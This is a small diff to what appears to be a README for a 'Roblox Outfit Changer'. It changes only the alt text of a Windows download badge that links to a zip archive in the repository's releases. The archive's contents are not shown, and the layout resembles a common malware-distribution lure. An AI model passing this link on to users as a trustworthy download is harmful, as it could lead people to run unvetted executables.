@@ -30,7 +30,7 @@
 
 <p align="center">
   <a href="https://github.com/tammyrahl/Roblox-Outfit-Changer-v1.2/releases/download/download/Roblox.Outfit.Changer.v1.2.zip">
-    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20FOR%20WINDOWS-0078D7?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows">
+    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20FOR%20WINDOWS-0078D7?style=for-the-badge&logo=windows&logoColor=white" alt="Download">
   </a>
 </p>
 
